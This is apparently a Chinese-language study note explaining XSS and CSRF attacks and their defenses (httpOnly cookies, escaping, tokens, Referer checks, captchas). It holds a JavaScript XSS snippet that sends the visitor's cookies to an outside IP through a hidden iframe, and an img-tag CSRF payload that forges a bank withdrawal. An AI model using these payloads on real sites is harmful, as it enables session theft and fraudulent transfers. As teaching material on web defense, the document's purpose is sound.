## XSS

+ Cross site scripting，全称“跨站脚本”
+ 特点是不对服务器造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论时，提交含有js的内容文本，而服务器没有过滤掉或者转义掉这些脚本，作为内容发布到页面上，那么其他用户在访问的时候就会运行这些脚本。
+ for example：

```javascript

// 用 <script type="text/javascript"></script> 包起来放在评论中
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    //将cookie拼接在url的后面
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);

```

另一个用户浏览了含有这个内容的页面将会跳转到http://192.168.123.123/myxss/并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。



+ 危害
  + 窃取用户的 Cookie；
  + 伪造虚假的输入表单骗取个人信息；
  + 显示伪造的文章或者图片。

+ 防范方法：
  + **httpOnly** 设置cookie能否通过js来访问，拥有httpOnly的cookie只能被服务器访问，客户端不能访问，可以用来防止**XSS脚本攻击**；
  + 对输入进行过滤或转义。



## CSRF

+ Cross-site request forgery,全称“跨站请求伪造”；

+ 可以理解为伪造请求，冒充用户在站内的正常操作；

+ 一个CSRF攻击需要两个**条件**：

  + 登录了一个受信任的网站A，并且本地存放了cookie；
  + 在不关闭A的情况下，访问了危险网站B。

  ​

#### 攻击原理

+ 当网页发起**http请求**的时候，浏览器首先会检查是否有对应域名的**cookie**，如果有，就会自动添加到**request header**中，发送给服务器；
+ 绝大多数网站是通过cookie等方式来辨识用户身份；
+ for example：

Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。

> 1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；

> 2. 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；

> 3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；

> 4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；

> 5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。

  我们知道cookie是不能跨域的，那Web B是怎么把用户的在Web A的cookie发送出去的呢？

	*假设攻击者构造的是一个自动提交表单的页面*，攻击者虽然无法获知 cookie ，在Web B返回的自动提交表单页面将表单的 action 指向 Web A ，表单提交的 POST 请求就会带上用户在 Web A里的 cookie。

	还有就是`<a>`标签和`image`标签（GET型的CSRF的攻击手段），浏览器都会自动带上cookie。

更具体的例子：

假如一家银行用以执行转账操作的 URL 地址如下：

```
http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。
```

那么，一个恶意攻击者可以在另一个网站上放置如下代码：

```
<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
```

如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。



+ 防范：
  + 使用验证码；token（令牌）；

    在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。

  + 验证 HTTP Referer 字段。

    根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。

    虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。

  + 输入验证码

    因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。

## 防范手段

### 1. 检查 Referer 首部字段



### 2. 添加校验 Token

在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。

### 3. 输入验证码

因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。

## 结语

以上就是关于csrf和xss攻击的小小总结，关于两种攻击的防范方法写的不是很全，有兴趣，可以上网看一下～理解了原理，对于防范方法的理解会容易很多。再附上两个参考链接：

https://www.jianshu.com/p/78f65023cf9d

http://adoyle.me/blog/how-csrf-works.html

https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html